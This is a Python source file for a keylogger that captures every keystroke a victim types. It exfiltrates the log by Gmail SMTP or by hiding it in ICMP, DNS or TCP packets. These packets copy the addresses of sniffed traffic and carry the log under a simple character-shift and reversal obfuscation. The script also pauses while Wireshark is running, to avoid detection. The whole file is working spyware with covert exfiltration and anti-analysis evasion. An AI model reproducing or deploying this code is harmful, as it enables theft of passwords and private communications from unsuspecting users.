import random

import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime


import scapy.volatile
from scapy import *
from scapy.arch import get_if_list
from scapy.all import raw
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, ICMP, UDP, TCP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import *

SEND_REPORT_EVERY = 5  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "put_real_address_here@gmail.com"
EMAIL_PASSWORD = "put_real_pw"


def rev(s: str):
    x = ''
    for i in s:
        a = ord(i)+60
        x += chr(a)
        #print(x)
    return x

import psutil

# Iterate over all running process


def getProcess(name):
    for proc in psutil.process_iter():
        try:
            # Get process name & pid from process object.
            processName = proc.name()
            processID = proc.pid
            if processName == name:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False



class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()





    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            elif name == "tab":
                name = "[tab]"
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        #with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            #print((self.log).encode("utf8"), file=f)
        #print(self.log)
        self.send_packet(self.log)
        #print(f"[+] Saved {self.filename}.txt")

    def send_packet(self, message):

        p = sniff(count=1)
        #p[0].show()
        #dest = '192.168.43.' + "1" #str(random.randint(1, 250))
        #source = '192.168.43.' + str(random.randint(1, 250))
        #print(dest)
        i=0
        while not p[0].haslayer(Raw):
            p = sniff(count=1)
            #print(i)
            i+=1

        sending_packet = p[0].copy()

        #p[0][IP].src = "1.2.3.4"
        i = 3 # random.randint(1,3)
        if i==1:
            sending_packet = IP(src=p[0][IP].src,dst=p[0][IP].dst)/ICMP()/rev(("kkk" + str(message))).encode()[::-1]
        elif i==2:
            sending_packet = IP(src=p[0][IP].src,dst=p[0][IP].dst) /UDP() /DNS()/rev(("kkk" + str(message))).encode()[::-1]
        else:
            sending_packet = IP(src=p[0][IP].src,dst=p[0][IP].dst)/TCP()/rev(("kkk" + str(message))).encode()[::-1]

        def ver(s: str):
            x = ''
            for k in s:
                a = ord(k) - 60
                x += chr(a)
            return x

        #print(b'kkk' in sending_packet[0][Raw].load)
        xx = sending_packet[0][Raw].load
        #print((ver(xx[::-1].decode())))

        #sending_packet.show()
        #p[0].show()

        # sending_packet = IP(src=source, dst=dest) / ICMP() / ("kkk" + str(message))
        send(sending_packet, verbose=False)
        #sendp(sending_packet, verbose=False)

        #sending_packet.show()

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        while True:
            time.sleep(SEND_REPORT_EVERY)

            while getProcess("Wireshark.exe"):
                time.sleep(SEND_REPORT_EVERY)

            x=""
            if self.log:
                # if there is something in log, report it
                self.end_dt = datetime.now()
                # update `self.filename`
                self.update_filename()
                x=self.log[:]
                if self.report_method == "email":
                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, x)
                elif self.report_method == "file":
                    self.report_to_file()
                # if you want to print in the console, uncomment below line
                # print(f"[{self.filename}] - {self.log}")
                self.start_dt = datetime.now()

            def substract(a, b):
                try:
                    return "".join(a.rsplit(b))
                except:
                    return a
            #print("#" + self.log)
            self.log = substract(self.log,x)
            #print("#" + self.log)

        """
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
        """

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        #print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()


